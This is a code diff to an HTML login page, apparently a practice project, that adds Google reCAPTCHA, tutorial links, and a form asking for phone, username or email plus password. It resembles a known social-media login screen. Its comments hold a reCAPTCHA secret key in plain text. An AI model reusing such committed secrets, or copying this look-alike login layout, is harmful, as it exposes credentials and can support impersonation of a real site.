@@ -5,8 +5,16 @@
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <link href="img/logo.png" rel="icon" type="image/x-icon"/>
+        <script src='https://www.google.com/recaptcha/api.js'></script>
         <title>Recaptcha</title>
                 <script>
+                        // https://youtu.be/ZZT1xE5ZAwY
+                        // https://youtu.be/hcGIA7d5cA0
+                        // https://youtu.be/ydzrRCMS2B0
+                        
+                        // chave site 6LewiYYcAAAAANtCYVqIBxcXt4B8TkZZwaTUpetN
+                        // chave secreta 6LewiYYcAAAAAL4O3qlSUusVQKChuyoEGwwNu_u8
+
                         // SetTimeOut(function cl(){
                         //                 location.reload();
                         //         }, 800);
@@ -216,6 +224,7 @@ body{
                                 
                                         <input type="text" name="$user" placeholder="Phone number, username, or email">
                                         <input type="password" name="$pass" placeholder="Password">
+                                        <div class="g-recaptcha" data-sitekey="6LewiYYcAAAAANtCYVqIBxcXt4B8TkZZwaTUpetN"></div>
                                         <button type="submit" value="Submit" id="btnLogin" onclick="required()" class="form-btn">Login</button>
 
                                 <span class="has-separator">TEST</span>   
